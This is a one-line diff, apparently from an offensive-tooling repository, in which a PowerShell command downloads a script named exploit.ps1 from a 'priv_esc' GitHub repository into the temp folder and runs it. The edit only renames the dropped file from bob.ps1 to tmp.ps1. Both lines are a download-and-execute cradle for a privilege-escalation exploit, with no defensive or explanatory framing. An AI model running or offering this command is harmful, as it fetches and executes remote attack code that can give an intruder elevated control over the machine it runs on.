@@ -1,1 +1,1 @@
-powershell "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/llongtin/priv_esc/master/exploit.ps1',\"$env:temp\bob.ps1\");.\"$env:temp\bob.ps1\""
+powershell "IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/llongtin/priv_esc/master/exploit.ps1',\"$env:temp\tmp.ps1\");.\"$env:temp\tmp.ps1\""
